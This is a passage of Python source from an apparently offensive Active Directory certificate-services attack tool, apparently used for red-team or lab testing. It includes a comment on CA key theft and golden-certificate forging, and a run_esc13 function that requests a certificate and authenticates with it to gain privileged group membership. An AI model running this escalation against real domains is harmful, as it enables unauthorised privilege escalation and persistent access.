# key and the forged certificate (both `manual_required`: a forged certificate
# has no request ID, is absent from the CA database, and only CA key rotation
# removes it), and the transient service + temp key file on the CA host (removed
# and VERIFIED, then `reverted_confirmed`; `manual_required` if a removal could
# not be confirmed). Disclosure lives in the primitives so BOTH callers — the
# ESC5 executor dispatch and the live `adcs_golden_cert` — inherit it. Validated
# in the GOAD lab (`tests/lab/cases/adcs/goad_ca_backup_native.py`). See
# BACKLOG.md § "ESC5 (CA key theft + offline forge)".
# ---------------------------------------------------------------------------


async def run_esc13(config: EscConfig) -> EscResult:
    """ESC13: enroll in template with linked issuance-policy group OID.

    The issued cert embeds the group's SID, granting effective group membership
    during Kerberos authentication (the KDC adds the group to the PAC).
    Exploitation is a plain enrollment — no on-behalf-of, no template write.
    The linked privileged group is set by the template's msPKI-Certificate-Policy OID.
    """
    out = _output_dir(config, "esc13")
    try:
        req = await request_certificate_native(
            _request_cfg(config, upn=config.target_upn), out
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return EscResult(success=False, esc=13, error=str(exc))
    if not req.success:
        return EscResult(
            success=False, esc=13, error=req.error or "cert request failed"
        )

    print_info(
        "ESC13: certificate issued — embedded group OID grants privileged group membership at logon"
    )
    return await _pkinit(config, req.pfx_path, req.pfx_password or "", out)
